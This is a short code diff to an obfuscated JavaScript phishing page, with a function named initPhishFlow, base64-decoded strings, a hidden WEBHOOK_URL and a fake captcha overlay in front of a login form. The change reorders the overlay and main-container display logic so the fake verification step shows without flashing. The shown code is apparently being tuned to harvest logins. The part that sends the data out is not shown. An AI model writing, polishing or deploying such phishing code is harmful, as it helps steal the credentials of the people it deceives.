@@ -114,16 +114,21 @@ const getStr = (i) => atob(_0x4f2e[i]);
 const WEBHOOK_URL = getStr(0);
 
 const initPhishFlow = () => {
-    const hdr = document.getElementById('dynamic-header');
-    if (hdr) hdr.innerText = getStr(2);
-
+    const overlay = document.getElementById('captcha-overlay');
+    const main = document.querySelector('.main-container');
     const isVerified = sessionStorage.getItem('captcha_verified') === 'true';
+
+    // ⚡ INSTANT STATE RESOLUTION (Prevents Flashing)
     if (isVerified) {
-        const overlay = document.getElementById('captcha-overlay');
-        const main = document.querySelector('.main-container');
         if (overlay) overlay.style.display = 'none';
         if (main) main.style.display = 'flex';
+    } else {
+        if (overlay) overlay.style.display = 'flex';
+        if (main) main.style.display = 'none';
     }
+
+    const hdr = document.getElementById('dynamic-header');
+    if (hdr) hdr.innerText = getStr(2);
 
     const form = document.getElementById('login-form');
     if (form) {
